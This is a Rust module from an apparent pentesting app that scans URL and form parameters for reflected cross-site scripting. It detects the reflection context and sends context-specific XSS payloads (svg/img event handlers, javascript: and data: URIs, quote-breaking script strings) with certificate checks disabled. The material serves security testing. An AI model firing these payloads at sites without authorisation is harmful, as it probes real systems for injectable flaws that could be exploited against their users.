use std::sync::Arc;
use std::time::Duration;

use rand::Rng;
use serde::{Deserialize, Serialize};
use crate::compat::{AppHandle, Emitter};
use tokio::sync::Semaphore;
use url::Url;

#[derive(Debug, Clone, Deserialize)]
pub struct XssRequest {
    pub url: String,
    pub params: Option<Vec<String>>,
    pub methods: Vec<String>,
    pub concurrency: usize,
    pub timeout_ms: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct XssFinding {
    pub param: String,
    pub method: String,
    pub context: String,
    pub payload: String,
    pub evidence: String,
    pub confidence: String,
}

#[derive(Debug, Clone)]
enum RefContext {
    Html,
    HtmlAttribute(char), // quote char
    ScriptBlock,
    ScriptString(char),
    UrlAttribute,
    Comment,
}

fn random_canary() -> String {
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
    let mut rng = rand::thread_rng();
    let tail: String = (0..8).map(|_| chars[rng.gen_range(0..chars.len())]).collect();
    format!("pxs{tail}xsp")
}

fn detect_context(body: &str, canary: &str) -> Vec<RefContext> {
    let mut found = Vec::new();
    let bytes = body.as_bytes();
    let canary_bytes = canary.as_bytes();

    let mut i = 0;
    while i + canary_bytes.len() <= bytes.len() {
        if &bytes[i..i + canary_bytes.len()] == canary_bytes {
            // look backwards for context
            let before = &body[..i];
            let ctx = classify(before);
            found.push(ctx);
            i += canary_bytes.len();
        } else {
            i += 1;
        }
    }

    found
}

fn classify(before: &str) -> RefContext {
    let last_open_script = before.rfind("<script");
    let last_close_script = before.rfind("</script>");
    let in_script = match (last_open_script, last_close_script) {
        (Some(o), Some(c)) => o > c,
        (Some(_), None) => true,
        _ => false,
    };

    if in_script {
        let after_script = &before[last_open_script.unwrap()..];
        // find quotes within script
        let mut in_dq = false;
        let mut in_sq = false;
        for c in after_script.chars() {
            match c {
                '"' if !in_sq => in_dq = !in_dq,
                '\'' if !in_dq => in_sq = !in_sq,
                _ => {}
            }
        }
        if in_dq { return RefContext::ScriptString('"'); }
        if in_sq { return RefContext::ScriptString('\''); }
        return RefContext::ScriptBlock;
    }

    let last_open_tag = before.rfind('<');
    let last_close_tag = before.rfind('>');
    let in_tag = match (last_open_tag, last_close_tag) {
        (Some(o), Some(c)) => o > c,
        (Some(_), None) => true,
        _ => false,
    };

    if in_tag {
        // inside a tag — look for attribute context (href/src/action)
        let tag_segment = &before[last_open_tag.unwrap_or(0)..].to_lowercase();
        let last_eq = tag_segment.rfind('=');
        if let Some(eq_pos) = last_eq {
            let after_eq = &before[last_open_tag.unwrap() + eq_pos + 1..];
            let trimmed = after_eq.trim_start();
            let quote = trimmed.chars().next();
            // attribute name heuristic
            let is_url_attr = tag_segment.contains("href=") || tag_segment.contains("src=") || tag_segment.contains("action=");

            if is_url_attr {
                return RefContext::UrlAttribute;
            }
            if let Some(q) = quote {
                if q == '"' || q == '\'' {
                    return RefContext::HtmlAttribute(q);
                }
            }
            return RefContext::HtmlAttribute(' ');
        }
        return RefContext::HtmlAttribute(' ');
    }

    let last_comment_open = before.rfind("<!--");
    let last_comment_close = before.rfind("-->");
    let in_comment = match (last_comment_open, last_comment_close) {
        (Some(o), Some(c)) => o > c,
        (Some(_), None) => true,
        _ => false,
    };
    if in_comment { return RefContext::Comment; }

    RefContext::Html
}

fn payloads_for(ctx: &RefContext, canary: &str) -> Vec<(String, String)> {
    // returns (label, payload) — payload MUST contain canary for detection
    match ctx {
        RefContext::Html => vec![
            ("svg-onload".into(), format!("<svg/onload=alert('{canary}')>")),
            ("img-onerror".into(), format!("<img src=x onerror=alert('{canary}')>")),
            ("script-tag".into(), format!("<script>/*{canary}*/</script>")),
        ],
        RefContext::HtmlAttribute(q) => {
            let qs = q.to_string();
            vec![
                ("attr-break".into(), format!("{qs} onfocus=alert('{canary}') autofocus {qs}")),
                ("attr-close-tag".into(), format!("{qs}><svg onload=alert('{canary}')>")),
            ]
        }
        RefContext::ScriptBlock => vec![
            ("script-direct".into(), format!("alert('{canary}')//")),
            ("script-semicolon".into(), format!(";alert('{canary}');//")),
        ],
        RefContext::ScriptString(q) => {
            let qs = q.to_string();
            vec![
                ("js-string-break".into(), format!("{qs};alert('{canary}');//")),
                ("js-string-concat".into(), format!("{qs}+alert('{canary}')+{qs}")),
            ]
        }
        RefContext::UrlAttribute => vec![
            ("javascript-url".into(), format!("javascript:alert('{canary}')")),
            ("data-uri".into(), format!("data:text/html,<script>alert('{canary}')</script>")),
        ],
        RefContext::Comment => vec![
            ("break-comment".into(), format!("--><svg onload=alert('{canary}')>")),
        ],
    }
}

fn ctx_name(ctx: &RefContext) -> &'static str {
    match ctx {
        RefContext::Html => "HTML body",
        RefContext::HtmlAttribute(_) => "HTML attribute",
        RefContext::ScriptBlock => "JS block",
        RefContext::ScriptString(_) => "JS string",
        RefContext::UrlAttribute => "URL attribute",
        RefContext::Comment => "HTML comment",
    }
}

async fn send(
    client: &reqwest::Client,
    method: &str,
    base: &Url,
    param: &str,
    value: &str,
    other_params: &[(String, String)],
) -> Option<String> {
    let resp = if method == "POST" {
        let mut form: Vec<(String, String)> = other_params.to_vec();
        form.push((param.to_string(), value.to_string()));
        client.post(base.as_str()).form(&form).send().await.ok()?
    } else {
        let mut u = base.clone();
        u.query_pairs_mut().clear();
        for (k, v) in other_params {
            u.query_pairs_mut().append_pair(k, v);
        }
        u.query_pairs_mut().append_pair(param, value);
        client.get(u).send().await.ok()?
    };
    resp.text().await.ok()
}

pub async fn xss_scan(app: AppHandle, req: XssRequest) -> Result<Vec<XssFinding>, String> {
    let base = Url::parse(&req.url).map_err(|e| e.to_string())?;
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_millis(req.timeout_ms))
        .redirect(reqwest::redirect::Policy::limited(3))
        .user_agent("Mozilla/5.0 (PocketPentester)")
        .build()
        .map_err(|e| e.to_string())?;

    let query_params: Vec<(String, String)> =
        base.query_pairs().map(|(k, v)| (k.into_owned(), v.into_owned())).collect();

    let param_names: Vec<String> = req.params.unwrap_or_else(|| {
        query_params.iter().map(|(k, _)| k.clone()).collect()
    });

    if param_names.is_empty() {
        return Err("no parameters to test".into());
    }

    let mut findings: Vec<XssFinding> = Vec::new();
    let sem = Arc::new(Semaphore::new(req.concurrency.max(1)));

    for method in &req.methods {
        for param in &param_names {
            let others: Vec<(String, String)> = query_params
                .iter()
                .filter(|(k, _)| k != param)
                .cloned()
                .collect();

            // 1. reflection probe with canary
            let canary = random_canary();
            let _ = app.emit("xss:status", format!("→ {} {} [canary {canary}]", method, param));
            let _permit = sem.acquire().await.unwrap();
            let body = match send(&client, method, &base, param, &canary, &others).await {
                Some(b) => b,
                None => continue,
            };
            drop(_permit);

            if !body.contains(&canary) {
                let _ = app.emit("xss:status", format!("  no reflection in {param}"));
                continue;
            }

            let contexts = detect_context(&body, &canary);
            let _ = app.emit(
                "xss:status",
                format!("  reflected in {} context(s)", contexts.len()),
            );

            // 2. for each context, try payloads
            for ctx in &contexts {
                let attack_canary = random_canary();
                for (label, payload) in payloads_for(ctx, &attack_canary) {
                    let _permit = sem.acquire().await.unwrap();
                    let body2 = match send(&client, method, &base, param, &payload, &others).await {
                        Some(b) => b,
                        None => continue,
                    };

                    if body2.contains(&attack_canary) {
                        // check payload survived mostly unescaped
                        let key_markers = ["<svg", "<img", "<script", "onerror=", "onload=", "alert(", "javascript:"];
                        let survived = key_markers.iter().any(|m| body2.contains(m) && payload.contains(m));

                        let finding = XssFinding {
                            param: param.clone(),
                            method: method.clone(),
                            context: ctx_name(ctx).into(),
                            payload: payload.clone(),
                            evidence: if survived {
                                format!("canary + payload tag survived in {label}")
                            } else {
                                format!("canary reflected but payload possibly escaped ({label})")
                            },
                            confidence: if survived { "HIGH".into() } else { "LOW".into() },
                        };
                        let _ = app.emit("xss:hit", finding.clone());
                        findings.push(finding);
                        if survived { break; }
                    }
                }
            }
        }
    }

    let _ = app.emit("xss:done", findings.len());
    Ok(findings)
}
